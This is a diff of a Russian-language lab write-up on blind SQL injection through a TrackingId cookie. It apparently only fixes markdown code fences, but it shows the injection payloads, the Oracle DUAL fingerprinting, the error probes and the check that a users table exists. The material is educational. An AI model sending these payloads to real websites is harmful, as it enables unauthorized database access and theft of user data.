@@ -13,13 +13,14 @@
 1) Для работы нам необходимо доказать уязвимость параметра.
 2) Далее сделаем запрос:
 
-sql```
+```sql
 Cookie: TrackingId=nuY97mfc9YodwK25'|| (SELECT '') || '
 ```
 нам возвращает ошибку 500...
 
 Пытаемся изменить синтаксис, проверяем Orcale:
-sql```
+
+```sql
 Cookie: TrackingId=nuY97mfc9YodwK25'|| (SELECT '' FROM DUAL) || '
 ```
 Видим ответ `HTTP/2 200 OK`
@@ -28,13 +29,13 @@ Cookie: TrackingId=nuY97mfc9YodwK25'|| (SELECT '' FROM DUAL) || '
 
 Для того, чтобы быть уверенным, что перед нами Blind-SQL-Injection попытаемся получить данные из несуществующей таблицы (посмотрим на поведение веб-сайта):
 
-sql```
+```sql
 Cookie: TrackingId=zAzb3amQWMFUTIlS' || (SELECT '' FROM DUALFIEWJFOW) ||'
 ```
 
 Видим ошибку:
 
-sql```
+```sql
 HTTP/2 500 Internal Server Error
 Content-Type: text/html; charset=utf-8
 X-Frame-Options: SAMEORIGIN
@@ -42,13 +43,13 @@ Content-Length: 2330
 ```
 Следующим шагом, нам необходимо убедиться, что список пользователей существует в БД:
 
-sql```
+```sql
 Cookie: TrackingId=zAzb3amQWMFUTIlS' || (SELECT '' FROM users WHERE ROWNUM = 1) ||'
 ```
 
 Для чего я добавил `WHERE ROWNUM = 1`? Все потому что, если оставить
 
-sql```
+```sql
 Cookie: TrackingId=zAzb3amQWMFUTIlS' || (SELECT '' FROM users) ||'
 ```
 
